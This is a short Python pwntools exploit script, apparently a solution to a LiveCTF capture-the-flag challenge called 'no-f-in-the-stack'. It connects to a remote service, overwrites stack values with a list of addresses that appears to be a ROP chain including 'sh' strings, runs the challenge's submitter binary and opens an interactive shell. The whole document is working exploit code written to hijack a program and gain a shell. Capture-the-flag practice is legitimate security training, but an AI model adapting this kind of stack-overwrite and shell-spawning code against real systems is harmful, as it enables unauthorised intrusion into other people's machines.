#!/usr/bin/env python3

from pwn import *
import string

# s = process("./no-f-in-the-stack/handout/challenge", env={})

HOST = os.environ.get("HOST", "localhost")
PORT = 31337
s = remote(HOST, int(PORT))


def write(value):
    value = "%x" % value
    assert value.isdigit()
    s.sendlineafter(b": ", value.encode())


for _ in range(4):
    write(4 << 32)

payload = [
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000469630,
    0x0000000000402216,
    0x6873,
    0x6873,
    0x6873,
    0x0000000000426830,
    0x0000000000401917,
]

for x in payload:
    write(x)

# raw_input("debug")
write(0)

time.sleep(0.1)
s.sendline("/home/livectf/submitter")
s.interactive()
